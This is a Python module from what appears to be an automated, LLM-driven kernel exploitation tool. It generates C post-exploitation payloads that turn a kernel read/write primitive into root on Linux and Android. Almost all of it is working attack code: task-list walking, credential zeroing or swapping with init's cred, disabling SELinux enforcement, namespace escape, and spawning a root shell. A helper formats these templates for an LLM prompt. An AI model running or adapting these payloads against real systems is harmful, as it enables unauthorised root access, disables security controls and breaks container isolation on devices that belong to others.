"""
exploit.post_exploit — Post-exploitation payload generation.

Generates the "endgame" code that converts a kernel R/W primitive
into a fully functional privilege escalation: task traversal,
credential overwrite, SELinux disable, namespace escape, and
/proc/self/exe self-reexec as root.

All generated code is parameterised by kernel offsets from
``kernel_resolver``, so it works across kernel versions without
LLM hallucination.
"""

from __future__ import annotations

from typing import Any, Dict, Optional

from ..core.log import console


# ── Post-exploitation C templates ─────────────────────────────────────

_TASK_WALKER_TEMPLATE = r"""
/* ── Task walker: find current task's cred pointer ───────────────────
 *
 * Walks the task_struct linked list from init_task → current task,
 * matching on pid.  Returns the address of our task_struct, or 0.
 *
 * Requires:
 *   INIT_TASK_ADDR        — address of init_task
 *   TASKS_OFFSET          — offset of task_struct.tasks
 *   PID_OFFSET            — offset of task_struct.pid
 *   CRED_OFFSET           — offset of task_struct.cred
 *   COMM_OFFSET           — offset of task_struct.comm
 *   kread64(addr)         — kernel arbitrary read primitive
 */

static uint64_t find_my_task(uint64_t init_task_addr) {
    pid_t my_pid = getpid();
    uint64_t task = init_task_addr;
    int limit = 4096;

    printf("[*] Walking task list from init_task=0x%lx, looking for pid=%d\n",
           (unsigned long)init_task_addr, my_pid);

    do {
        uint32_t pid = (uint32_t)kread64(task + PID_OFFSET);
        if (pid == (uint32_t)my_pid) {
            printf("[+] Found our task_struct at 0x%lx (pid=%d)\n",
                   (unsigned long)task, pid);
            return task;
        }

        /* Follow tasks.next and subtract offset to get task_struct base */
        uint64_t next = kread64(task + TASKS_OFFSET);
        task = next - TASKS_OFFSET;

        if (task == init_task_addr) break;
    } while (--limit > 0);

    printf("[-] Could not find task with pid=%d\n", my_pid);
    return 0;
}
"""

_CRED_OVERWRITE_TEMPLATE = r"""
/* ── Credential overwrite: zero UID/GID fields ──────────────────────
 *
 * Reads the cred pointer from our task_struct, then zeroes out
 * uid, gid, suid, sgid, euid, egid, fsuid, fsgid (8 consecutive
 * uint32 fields starting at offset 4 in struct cred).
 *
 * Requires:
 *   CRED_OFFSET           — offset of task_struct.cred
 *   CRED_UID_OFFSET       — offset of cred.uid (typically 4)
 *   kread64(addr)         — kernel arbitrary read primitive
 *   kwrite64(addr, val)   — kernel arbitrary write primitive
 */

static int overwrite_cred(uint64_t task_addr) {
    uint64_t cred = kread64(task_addr + CRED_OFFSET);
    printf("[*] task_struct.cred = 0x%lx\n", (unsigned long)cred);

    if (!cred || cred < 0xffff000000000000ULL) {
        printf("[-] Invalid cred pointer\n");
        return -1;
    }

    /* Zero uid, gid, suid, sgid, euid, egid, fsuid, fsgid
     * These are 8 consecutive uint32 fields. We zero them in pairs
     * using 64-bit writes (2 fields per write = 4 writes total). */
    for (int i = 0; i < 4; i++) {
        kwrite64(cred + CRED_UID_OFFSET + i * 8, 0);
    }

    uid_t check = getuid();
    printf("[*] UID after overwrite: %d\n", check);
    return (check == 0) ? 0 : -1;
}
"""

_CRED_SWAP_TEMPLATE = r"""
/* ── Credential swap: copy init_task's cred to our task ──────────────
 *
 * Instead of zeroing individual fields, swap our task's cred and
 * real_cred pointers to point at init_task's cred (which has uid=0).
 *
 * Requires:
 *   CRED_OFFSET           — offset of task_struct.cred
 *   REAL_CRED_OFFSET      — offset of task_struct.real_cred
 *   kread64(addr)         — kernel arbitrary read primitive
 *   kwrite64(addr, val)   — kernel arbitrary write primitive
 */

static int swap_cred_with_init(uint64_t task_addr, uint64_t init_task_addr) {
    uint64_t init_cred = kread64(init_task_addr + CRED_OFFSET);
    printf("[*] init_task.cred = 0x%lx\n", (unsigned long)init_cred);

    if (!init_cred || init_cred < 0xffff000000000000ULL) {
        printf("[-] Invalid init cred pointer\n");
        return -1;
    }

    /* Swap both cred and real_cred */
    kwrite64(task_addr + CRED_OFFSET, init_cred);
    kwrite64(task_addr + REAL_CRED_OFFSET, init_cred);

    uid_t check = getuid();
    printf("[*] UID after cred swap: %d\n", check);
    return (check == 0) ? 0 : -1;
}
"""

_SELINUX_DISABLE_TEMPLATE = r"""
/* ── SELinux bypass: zero the enforcing flag ─────────────────────────
 *
 * On Android, even uid=0 is useless without disabling SELinux.
 * struct selinux_state.enforcing is at a known offset (varies by
 * kernel version: 0 on some, varies otherwise).
 *
 * Requires:
 *   SELINUX_STATE_ADDR    — address of selinux_state symbol
 *   SELINUX_ENFORCING_OFF — offset of .enforcing in selinux_state
 *   kread64(addr)         — kernel arbitrary read primitive
 *   kwrite64(addr, val)   — kernel arbitrary write primitive
 */

static int disable_selinux(void) {
    if (SELINUX_STATE_ADDR == 0) {
        printf("[!] selinux_state address not resolved, skipping\n");
        return -1;
    }

    uint64_t enforcing_addr = SELINUX_STATE_ADDR + SELINUX_ENFORCING_OFF;
    uint64_t old = kread64(enforcing_addr);
    printf("[*] selinux_state.enforcing was: %lu\n", (unsigned long)old);

    kwrite64(enforcing_addr, 0);

    printf("[+] SELinux enforcing zeroed\n");
    return 0;
}
"""

_NAMESPACE_ESCAPE_TEMPLATE = r"""
/* ── Namespace escape: copy init_task's nsproxy ──────────────────────
 *
 * If running inside a container or restricted namespace, copy
 * init_task's nsproxy to our task to break out.
 *
 * Requires:
 *   NSPROXY_OFFSET        — offset of task_struct.nsproxy
 *   kread64(addr)         — kernel arbitrary read
 *   kwrite64(addr, val)   — kernel arbitrary write
 */

static int escape_namespace(uint64_t task_addr, uint64_t init_task_addr) {
    uint64_t init_nsproxy = kread64(init_task_addr + NSPROXY_OFFSET);
    printf("[*] init_task.nsproxy = 0x%lx\n", (unsigned long)init_nsproxy);

    if (!init_nsproxy) {
        printf("[-] init nsproxy is NULL, skipping\n");
        return -1;
    }

    kwrite64(task_addr + NSPROXY_OFFSET, init_nsproxy);
    printf("[+] nsproxy swapped to init_task's\n");
    return 0;
}
"""

_ROOT_SHELL_TEMPLATE = r"""
/* ── Root shell / verification ───────────────────────────────────────
 *
 * After cred overwrite, the real/effective/saved UIDs may not all be 0.
 * We call setresuid(0,0,0) as a VALIDATION GATE — it normalises all
 * three if the kernel allows it (i.e. the cred has at least one uid
 * field set to 0).  This is the approach used by real exploits (badnode,
 * badspin, bad_io_uring).  Then we check getuid() for confirmation.
 */

static void post_exploit_verify(void) {
    /* Step 1: Normalise UIDs — this is the critical validation step */
    int uid_ok = (setresuid(0, 0, 0) == 0);
    int gid_ok = (setresgid(0, 0, 0) == 0);

    uid_t uid = getuid();
    printf("SYZPLOIT_UID_AFTER=%d\n", uid);
    fflush(stdout);

    if (uid == 0) {
        printf("[+] SUCCESS: privilege escalation confirmed! UID=0\n");
        fflush(stdout);
        /* Re-exec as root to refresh capability set */
        execl("/bin/sh", "sh", NULL);
    } else if (uid_ok) {
        /* setresuid succeeded but getuid still non-zero — odd but report */
        printf("[?] setresuid(0,0,0) returned 0 but getuid()=%d\n", uid);
    } else {
        printf("[-] Privilege escalation FAILED. "
               "setresuid rc=%d, UID=%d\n", !uid_ok, uid);
    }
}
"""

_CLEANUP_TEMPLATE = r"""
/* ── Exploit cleanup: restore kernel state ───────────────────────────
 *
 * Best-effort: restore corrupted pointers to avoid a panic after
 * the exploit runs.  Many exploits skip this, but it helps stability.
 */

static void exploit_cleanup(void) {
    /* Override this with exploit-specific cleanup.
     * Common actions:
     *   - Restore original pipe_buffer ops pointer
     *   - Restore original function pointers in corrupted objects
     *   - Close all spray file descriptors
     *   - Free allocated resources
     */
    printf("[*] Cleaning up exploit state...\n");
}
"""


class PostExploitGenerator:
    """Generates post-exploitation C code parameterised by kernel offsets.

    The offsets dict should come from ``KernelResolver.generate_exploit_header()``,
    but this class also works with manually specified offsets.
    """

    def __init__(
        self,
        offsets: Optional[Dict[str, Any]] = None,
        platform: str = "android",
    ) -> None:
        self._offsets = offsets or {}
        self._platform = platform

    def generate_task_walker(self) -> str:
        """Return task-list-walking C code."""
        return _TASK_WALKER_TEMPLATE

    def generate_cred_overwrite(self) -> str:
        """Return cred uid/gid zeroing C code."""
        return _CRED_OVERWRITE_TEMPLATE

    def generate_cred_swap(self) -> str:
        """Return init_cred swap C code."""
        return _CRED_SWAP_TEMPLATE

    def generate_selinux_bypass(self) -> str:
        """Return SELinux enforcing disable C code."""
        return _SELINUX_DISABLE_TEMPLATE

    def generate_namespace_escape(self) -> str:
        """Return namespace escape C code."""
        return _NAMESPACE_ESCAPE_TEMPLATE

    def generate_root_shell(self) -> str:
        """Return root shell / verification C code."""
        return _ROOT_SHELL_TEMPLATE

    def generate_cleanup(self) -> str:
        """Return cleanup template C code."""
        return _CLEANUP_TEMPLATE

    def generate_post_exploit_payload(
        self,
        *,
        method: str = "cred_zero",
        disable_selinux: bool = True,
        escape_namespace: bool = False,
    ) -> str:
        """Generate a complete post-exploitation payload.

        Combines task walker + chosen privesc method + SELinux bypass
        + verification boilerplate into a single C section.

        Parameters
        ----------
        method:
            One of "cred_zero" (zero uid/gid fields),
            "cred_swap" (swap with init_task's cred).
        disable_selinux:
            Include SELinux bypass code (recommended for Android).
        escape_namespace:
            Include namespace escape code.
        """
        sections = []
        sections.append("/* ═══ Post-Exploitation Payload ═══ */\n")

        # Task walker — always needed
        sections.append(self.generate_task_walker())

        # Privilege escalation method
        if method == "cred_swap":
            sections.append(self.generate_cred_swap())
        else:
            sections.append(self.generate_cred_overwrite())

        # SELinux bypass (Android)
        if disable_selinux and self._platform == "android":
            sections.append(self.generate_selinux_bypass())

        # Namespace escape
        if escape_namespace:
            sections.append(self.generate_namespace_escape())

        # Cleanup + Verification
        sections.append(self.generate_cleanup())
        sections.append(self.generate_root_shell())

        # Main post-exploit orchestrator function
        orchestrator = self._generate_orchestrator(
            method=method,
            disable_selinux=disable_selinux and self._platform == "android",
            escape_namespace=escape_namespace,
        )
        sections.append(orchestrator)

        return "\n".join(sections)

    def format_for_prompt(self) -> str:
        """Format post-exploit capabilities for LLM prompt."""
        lines = [
            "=== Available Post-Exploitation Templates ===",
            "These tested C code templates are available for the endgame:",
            "  - find_my_task(): Walk task list to find current process",
            "  - overwrite_cred(): Zero uid/gid fields in cred struct",
            "  - swap_cred_with_init(): Swap cred with init_task's cred",
            "  - disable_selinux(): Zero selinux_state.enforcing",
            "  - escape_namespace(): Copy init's nsproxy",
            "  - post_exploit_verify(): Verify UID=0 and spawn shell",
            "",
            "All templates require kread64()/kwrite64() primitives",
            "and kernel_offsets.h defines for struct field offsets.",
        ]
        return "\n".join(lines)

    # ── Private ───────────────────────────────────────────────────────

    def _generate_orchestrator(
        self,
        *,
        method: str,
        disable_selinux: bool,
        escape_namespace: bool,
    ) -> str:
        """Generate the post_exploit() orchestrator function."""
        selinux_call = (
            '    printf("[*] Disabling SELinux...\\n");\n'
            "    disable_selinux();\n"
            if disable_selinux
            else ""
        )
        ns_call = (
            '    printf("[*] Escaping namespace...\\n");\n'
            "    escape_namespace(my_task, INIT_TASK_ADDR);\n"
            if escape_namespace
            else ""
        )
        if method == "cred_swap":
            privesc_call = (
                '    printf("[*] Swapping cred with init_task...\\n");\n'
                "    if (swap_cred_with_init(my_task, INIT_TASK_ADDR) != 0) {\n"
                '        printf("[-] Cred swap failed\\n");\n'
                "        return -1;\n"
                "    }\n"
            )
        else:
            privesc_call = (
                '    printf("[*] Overwriting cred uid/gid...\\n");\n'
                "    if (overwrite_cred(my_task) != 0) {\n"
                '        printf("[-] Cred overwrite failed\\n");\n'
                "        return -1;\n"
                "    }\n"
            )

        return f"""
/* ── Post-exploit orchestrator ───────────────────────────────────── */

static int post_exploit(void) {{
    printf("[*] Starting post-exploitation...\\n");

    /* Step 1: Find our task_struct */
    uint64_t my_task = find_my_task(INIT_TASK_ADDR);
    if (!my_task) {{
        printf("[-] Failed to find task_struct\\n");
        return -1;
    }}

    /* Step 2: Privilege escalation */
{privesc_call}
{selinux_call}{ns_call}
    /* Step 3: Cleanup and verify */
    exploit_cleanup();
    post_exploit_verify();
    return 0;
}}
"""
